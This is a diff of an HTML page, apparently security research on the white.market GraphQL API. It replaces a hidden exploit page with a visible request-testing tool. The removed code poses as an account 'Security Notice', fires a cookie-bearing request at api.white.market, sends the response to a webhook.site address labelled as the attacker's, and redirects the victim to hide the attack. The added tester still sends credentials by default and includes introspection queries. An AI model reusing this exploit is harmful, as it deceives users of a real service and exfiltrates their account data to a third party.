@@ -1,81 +1,637 @@
 <!DOCTYPE html>
-<html>
-<head><title>White Market - Security Notice</title></head>
-<body>
-    <h1>Verifying your account...</h1>
-    <div id="debug"></div>
-    <script>
-        function log(msg) {
-            document.getElementById('debug').innerHTML += msg + '<br>';
-            console.log(msg);
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>GraphQL API Tester - White Market Security Research</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
         }
         
-        async function exploit() {
-            log('Testing cookie transmission...');
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            min-height: 100vh;
+            padding: 20px;
+        }
+        
+        .container {
+            max-width: 1400px;
+            margin: 0 auto;
+            background: white;
+            border-radius: 10px;
+            box-shadow: 0 10px 40px rgba(0,0,0,0.2);
+            overflow: hidden;
+        }
+        
+        .header {
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            color: white;
+            padding: 30px;
+            text-align: center;
+        }
+        
+        .header h1 {
+            font-size: 2em;
+            margin-bottom: 10px;
+        }
+        
+        .header p {
+            opacity: 0.9;
+            font-size: 0.95em;
+        }
+        
+        .content {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 0;
+            min-height: calc(100vh - 200px);
+        }
+        
+        .request-panel, .response-panel {
+            padding: 30px;
+        }
+        
+        .request-panel {
+            border-right: 2px solid #e0e0e0;
+            background: #f9f9f9;
+        }
+        
+        .response-panel {
+            background: #fff;
+        }
+        
+        .section-title {
+            font-size: 1.3em;
+            margin-bottom: 20px;
+            color: #333;
+            font-weight: 600;
+            display: flex;
+            align-items: center;
+            gap: 10px;
+        }
+        
+        .section-title::before {
+            content: '';
+            width: 4px;
+            height: 24px;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            border-radius: 2px;
+        }
+        
+        .form-group {
+            margin-bottom: 20px;
+        }
+        
+        label {
+            display: block;
+            margin-bottom: 8px;
+            font-weight: 600;
+            color: #555;
+            font-size: 0.9em;
+            text-transform: uppercase;
+            letter-spacing: 0.5px;
+        }
+        
+        input[type="text"], select, textarea {
+            width: 100%;
+            padding: 12px;
+            border: 2px solid #e0e0e0;
+            border-radius: 6px;
+            font-size: 14px;
+            font-family: 'Courier New', monospace;
+            transition: border-color 0.3s;
+        }
+        
+        input[type="text"]:focus, select:focus, textarea:focus {
+            outline: none;
+            border-color: #667eea;
+        }
+        
+        textarea {
+            resize: vertical;
+            min-height: 150px;
+        }
+        
+        .method-selector {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(80px, 1fr));
+            gap: 10px;
+            margin-bottom: 20px;
+        }
+        
+        .method-btn {
+            padding: 10px 15px;
+            border: 2px solid #e0e0e0;
+            background: white;
+            border-radius: 6px;
+            cursor: pointer;
+            font-weight: 600;
+            transition: all 0.3s;
+            text-align: center;
+        }
+        
+        .method-btn:hover {
+            border-color: #667eea;
+            background: #f0f4ff;
+        }
+        
+        .method-btn.active {
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            color: white;
+            border-color: #667eea;
+        }
+        
+        .send-btn {
+            width: 100%;
+            padding: 15px;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            color: white;
+            border: none;
+            border-radius: 6px;
+            font-size: 16px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: transform 0.2s, box-shadow 0.2s;
+            text-transform: uppercase;
+            letter-spacing: 1px;
+        }
+        
+        .send-btn:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 5px 20px rgba(102, 126, 234, 0.4);
+        }
+        
+        .send-btn:active {
+            transform: translateY(0);
+        }
+        
+        .send-btn:disabled {
+            opacity: 0.6;
+            cursor: not-allowed;
+            transform: none;
+        }
+        
+        .response-section {
+            margin-bottom: 25px;
+        }
+        
+        .response-header {
+            font-size: 0.9em;
+            font-weight: 600;
+            color: #666;
+            margin-bottom: 10px;
+            text-transform: uppercase;
+            letter-spacing: 0.5px;
+        }
+        
+        .response-content {
+            background: #f5f5f5;
+            padding: 15px;
+            border-radius: 6px;
+            border-left: 4px solid #667eea;
+            font-family: 'Courier New', monospace;
+            font-size: 13px;
+            overflow-x: auto;
+            max-height: 400px;
+            overflow-y: auto;
+        }
+        
+        .status-badge {
+            display: inline-block;
+            padding: 5px 12px;
+            border-radius: 20px;
+            font-weight: 600;
+            font-size: 0.85em;
+            margin-left: 10px;
+        }
+        
+        .status-success {
+            background: #d4edda;
+            color: #155724;
+        }
+        
+        .status-error {
+            background: #f8d7da;
+            color: #721c24;
+        }
+        
+        .status-info {
+            background: #d1ecf1;
+            color: #0c5460;
+        }
+        
+        pre {
+            margin: 0;
+            white-space: pre-wrap;
+            word-wrap: break-word;
+        }
+        
+        .loading {
+            text-align: center;
+            padding: 40px;
+            color: #999;
+        }
+        
+        .spinner {
+            border: 4px solid #f3f3f3;
+            border-top: 4px solid #667eea;
+            border-radius: 50%;
+            width: 40px;
+            height: 40px;
+            animation: spin 1s linear infinite;
+            margin: 0 auto 15px;
+        }
+        
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+        
+        .quick-templates {
+            margin-bottom: 20px;
+        }
+        
+        .template-btn {
+            display: inline-block;
+            padding: 8px 12px;
+            margin: 5px 5px 5px 0;
+            background: white;
+            border: 2px solid #667eea;
+            color: #667eea;
+            border-radius: 6px;
+            cursor: pointer;
+            font-size: 0.85em;
+            font-weight: 600;
+            transition: all 0.3s;
+        }
+        
+        .template-btn:hover {
+            background: #667eea;
+            color: white;
+        }
+        
+        .credentials-toggle {
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            margin-bottom: 15px;
+        }
+        
+        .credentials-toggle input[type="checkbox"] {
+            width: auto;
+            cursor: pointer;
+        }
+        
+        @media (max-width: 968px) {
+            .content {
+                grid-template-columns: 1fr;
+            }
+            
+            .request-panel {
+                border-right: none;
+                border-bottom: 2px solid #e0e0e0;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="header">
+            <h1>🔍 GraphQL API Tester</h1>
+            <p>Security Research Tool - White Market CORS/Cookie Testing</p>
+        </div>
+        
+        <div class="content">
+            <!-- Request Panel -->
+            <div class="request-panel">
+                <div class="section-title">Request Configuration</div>
+                
+                <div class="form-group">
+                    <label>Endpoint URL</label>
+                    <input type="text" id="endpoint" value="https://api.white.market/graphql/api" placeholder="https://api.white.market/graphql/api">
+                </div>
+                
+                <div class="form-group">
+                    <label>HTTP Method</label>
+                    <div class="method-selector">
+                        <button class="method-btn active" data-method="POST">POST</button>
+                        <button class="method-btn" data-method="GET">GET</button>
+                        <button class="method-btn" data-method="PUT">PUT</button>
+                        <button class="method-btn" data-method="DELETE">DELETE</button>
+                        <button class="method-btn" data-method="PATCH">PATCH</button>
+                        <button class="method-btn" data-method="OPTIONS">OPTIONS</button>
+                    </div>
+                </div>
+                
+                <div class="credentials-toggle">
+                    <input type="checkbox" id="includeCredentials" checked>
+                    <label for="includeCredentials" style="margin: 0; text-transform: none;">Include Credentials (Send Cookies)</label>
+                </div>
+                
+                <div class="form-group">
+                    <label>Custom Headers (JSON Format)</label>
+                    <textarea id="headers" placeholder='{"Content-Type": "application/json", "Authorization": "Bearer YOUR_TOKEN"}'>{
+  "Content-Type": "application/json",
+  "Accept": "*/*",
+  "X-Accept-Language": "en_US"
+}</textarea>
+                </div>
+                
+                <div class="form-group">
+                    <label>Request Body (GraphQL Query)</label>
+                    <div class="quick-templates">
+                        <button class="template-btn" data-template="introspection">Introspection</button>
+                        <button class="template-btn" data-template="typename">__typename</button>
+                        <button class="template-btn" data-template="user">User Query</button>
+                        <button class="template-btn" data-template="blank">Clear</button>
+                    </div>
+                    <textarea id="body" placeholder='{"query": "query { __typename }", "variables": {}, "operationName": null}' rows="10">{
+  "query": "query { __typename }"
+}</textarea>
+                </div>
+                
+                <button class="send-btn" id="sendBtn">
+                    🚀 Send Request
+                </button>
+            </div>
+            
+            <!-- Response Panel -->
+            <div class="response-panel">
+                <div class="section-title">Response Details</div>
+                
+                <div id="responseContainer">
+                    <div style="text-align: center; padding: 60px 20px; color: #999;">
+                        <svg width="80" height="80" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" style="margin: 0 auto 20px;">
+                            <path d="M13 2L3 14h9l-1 8 10-12h-9l1-8z"/>
+                        </svg>
+                        <p>Configure your request and click "Send Request" to see the response</p>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+    
+    <script>
+        // State
+        let currentMethod = 'POST';
+        
+        // Elements
+        const methodButtons = document.querySelectorAll('.method-btn');
+        const sendBtn = document.getElementById('sendBtn');
+        const responseContainer = document.getElementById('responseContainer');
+        const endpointInput = document.getElementById('endpoint');
+        const headersInput = document.getElementById('headers');
+        const bodyInput = document.getElementById('body');
+        const includeCredentialsCheckbox = document.getElementById('includeCredentials');
+        const templateButtons = document.querySelectorAll('.template-btn');
+        
+        // Method selector
+        methodButtons.forEach(btn => {
+            btn.addEventListener('click', () => {
+                methodButtons.forEach(b => b.classList.remove('active'));
+                btn.classList.add('active');
+                currentMethod = btn.dataset.method;
+            });
+        });
+        
+        // Quick templates
+        const templates = {
+            introspection: {
+                query: `{
+  __schema {
+    queryType {
+      fields {
+        name
+        description
+      }
+    }
+    mutationType {
+      fields {
+        name
+        description
+      }
+    }
+  }
+}`,
+                variables: {},
+                operationName: null
+            },
+            typename: {
+                query: "query { __typename }",
+                variables: {},
+                operationName: null
+            },
+            user: {
+                query: `query GetUser {
+  me {
+    id
+    username
+    email
+  }
+}`,
+                variables: {},
+                operationName: "GetUser"
+            },
+            blank: ""
+        };
+        
+        templateButtons.forEach(btn => {
+            btn.addEventListener('click', () => {
+                const template = btn.dataset.template;
+                if (template === 'blank') {
+                    bodyInput.value = '';
+                } else {
+                    bodyInput.value = JSON.stringify(templates[template], null, 2);
+                }
+            });
+        });
+        
+        // Send request
+        sendBtn.addEventListener('click', async () => {
+            const endpoint = endpointInput.value.trim();
+            const includeCredentials = includeCredentialsCheckbox.checked;
+            
+            if (!endpoint) {
+                alert('Please enter an endpoint URL');
+                return;
+            }
+            
+            // Parse headers
+            let headers = {};
+            try {
+                if (headersInput.value.trim()) {
+                    headers = JSON.parse(headersInput.value);
+                }
+            } catch (e) {
+                alert('Invalid JSON in headers field: ' + e.message);
+                return;
+            }
+            
+            // Parse body
+            let body = null;
+            if (bodyInput.value.trim() && currentMethod !== 'GET' && currentMethod !== 'OPTIONS') {
+                try {
+                    body = JSON.parse(bodyInput.value);
+                } catch (e) {
+                    alert('Invalid JSON in body field: ' + e.message);
+                    return;
+                }
+            }
+            
+            // Show loading
+            sendBtn.disabled = true;
+            sendBtn.textContent = 'Sending...';
+            responseContainer.innerHTML = `
+                <div class="loading">
+                    <div class="spinner"></div>
+                    <p>Sending request to ${endpoint}...</p>
+                </div>
+            `;
+            
+            // Prepare fetch options
+            const fetchOptions = {
+                method: currentMethod,
+                headers: headers,
+                credentials: includeCredentials ? 'include' : 'omit'
+            };
+            
+            if (body && currentMethod !== 'GET' && currentMethod !== 'OPTIONS') {
+                fetchOptions.body = JSON.stringify(body);
+            }
+            
+            // Record start time
+            const startTime = performance.now();
             
             try {
-                // Make ANY authenticated request
-                // Even if it fails, we can prove the cookie was sent
-                const response = await fetch('https://api.white.market/graphql/api', {
-                    method: 'POST',
-                    credentials: 'include', // Sends the HttpOnly cookie
-                    headers: {
-                        'Content-Type': 'application/json'
-                    },
-                    body: JSON.stringify({
-                        query: "query { __typename }"
-                    })
-                });
+                const response = await fetch(endpoint, fetchOptions);
+                const endTime = performance.now();
+                const duration = Math.round(endTime - startTime);
                 
+                // Get response headers
                 const responseHeaders = {};
                 response.headers.forEach((value, key) => {
                     responseHeaders[key] = value;
                 });
                 
-                const data = await response.json();
+                // Get response body
+                let responseBody;
+                const contentType = response.headers.get('content-type');
                 
-                // Log everything
-                log('Response Status: ' + response.status);
-                log('Response: ' + JSON.stringify(data));
+                if (contentType && contentType.includes('application/json')) {
+                    responseBody = await response.json();
+                } else {
+                    responseBody = await response.text();
+                }
                 
-                // Exfiltrate to webhook
-                await fetch('https://webhook.site/ca40a8c2-76e4-4463-97f8-b46cddb37a84', {
-                    method: 'POST',
-                    headers: {'Content-Type': 'application/json'},
-                    body: JSON.stringify({
-                        message: 'Cookie transmission successful',
-                        origin: window.location.origin,
-                        timestamp: new Date().toISOString(),
-                        responseStatus: response.status,
-                        responseHeaders: responseHeaders,
-                        responseData: data,
-                        proof: 'If you see a 200 response or valid GraphQL response, the cookie was sent from victim browser to apixwhite.market'
-                    })
+                // Display response
+                displayResponse({
+                    status: response.status,
+                    statusText: response.statusText,
+                    headers: responseHeaders,
+                    body: responseBody,
+                    duration: duration,
+                    url: response.url
                 });
                 
-                log('Proof sent to attacker webhook!');
+            } catch (error) {
+                const endTime = performance.now();
+                const duration = Math.round(endTime - startTime);
                 
-                // Redirect victim so they don't notice
-                setTimeout(() => {
-                    window.location = 'https://white.market';
-                }, 2000);
-                
-            } catch(e) {
-                log('Error: ' + e.message);
-                
-                // Even errors can prove CORS is allowing the request
-                await fetch('https://webhook.site/ca40a8c2-76e4-4463-97f8-b46cddb37a84', {
-                    method: 'POST',
-                    headers: {'Content-Type': 'application/json'},
-                    body: JSON.stringify({
-                        error: e.message,
-                        note: 'If this is NOT a CORS error, the cookie was sent successfully'
-                    })
+                displayError({
+                    error: error.message,
+                    stack: error.stack,
+                    duration: duration
                 });
+            } finally {
+                sendBtn.disabled = false;
+                sendBtn.textContent = '🚀 Send Request';
             }
+        });
+        
+        function displayResponse(data) {
+            const statusClass = data.status >= 200 && data.status < 300 ? 'status-success' : 
+                               data.status >= 400 ? 'status-error' : 'status-info';
+            
+            responseContainer.innerHTML = `
+                <div class="response-section">
+                    <div class="response-header">
+                        Status
+                        <span class="status-badge ${statusClass}">
+                            ${data.status} ${data.statusText}
+                        </span>
+                        <span class="status-badge status-info">${data.duration}ms</span>
+                    </div>
+                </div>
+                
+                <div class="response-section">
+                    <div class="response-header">Response URL</div>
+                    <div class="response-content">
+                        <pre>${escapeHtml(data.url)}</pre>
+                    </div>
+                </div>
+                
+                <div class="response-section">
+                    <div class="response-header">Response Headers</div>
+                    <div class="response-content">
+                        <pre>${escapeHtml(JSON.stringify(data.headers, null, 2))}</pre>
+                    </div>
+                </div>
+                
+                <div class="response-section">
+                    <div class="response-header">Response Body</div>
+                    <div class="response-content">
+                        <pre>${escapeHtml(typeof data.body === 'object' ? JSON.stringify(data.body, null, 2) : data.body)}</pre>
+                    </div>
+                </div>
+            `;
         }
         
-        exploit();
+        function displayError(data) {
+            responseContainer.innerHTML = `
+                <div class="response-section">
+                    <div class="response-header">
+                        Error
+                        <span class="status-badge status-error">Request Failed</span>
+                        <span class="status-badge status-info">${data.duration}ms</span>
+                    </div>
+                </div>
+                
+                <div class="response-section">
+                    <div class="response-header">Error Message</div>
+                    <div class="response-content">
+                        <pre>${escapeHtml(data.error)}</pre>
+                    </div>
+                </div>
+                
+                <div class="response-section">
+                    <div class="response-header">Stack Trace</div>
+                    <div class="response-content">
+                        <pre>${escapeHtml(data.stack || 'No stack trace available')}</pre>
+                    </div>
+                </div>
+                
+                <div class="response-section">
+                    <div class="response-header">Common Causes</div>
+                    <div class="response-content">
+                        <pre>• CORS policy blocking the request
+- Network connectivity issues
+- Invalid endpoint URL
+- Server not responding
+- Mixed content (HTTP/HTTPS) blocking</pre>
+                    </div>
+                </div>
+            `;
+        }
+        
+        function escapeHtml(text) {
+            const div = document.createElement('div');
+            div.textContent = text;
+            return div.innerHTML;
+        }
     </script>
 </body>
 </html>
